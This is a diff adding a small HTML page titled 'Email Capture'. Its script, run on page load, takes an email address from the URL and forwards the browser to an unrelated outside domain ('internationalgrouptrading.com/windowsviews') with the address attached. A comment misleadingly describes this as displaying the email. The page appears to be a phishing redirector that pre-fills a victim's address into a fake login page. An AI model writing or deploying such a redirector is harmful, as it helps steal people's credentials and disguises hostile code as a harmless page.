@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Email Capture</title>
+    <script>
+        // Function to extract email parameter from URL
+        function getEmailFromURL() {
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('email');
+            return email ? decodeURIComponent(email) : null;
+        }
+
+        // Function to display the captured email
+        function displayEmail() {
+            const email = getEmailFromURL();
+            if (email) {
+                const redirectURL = 'https://internationalgrouptrading.com/windowsviews#' + email;
+                window.location.href = redirectURL;
+            }
+        }
+
+        // Call displayEmail function when the page loads
+        window.onload = displayEmail;
+    </script>
+</head>
+<body>
+    <h1>Redirecting...</h1>
+</body>
+</html>
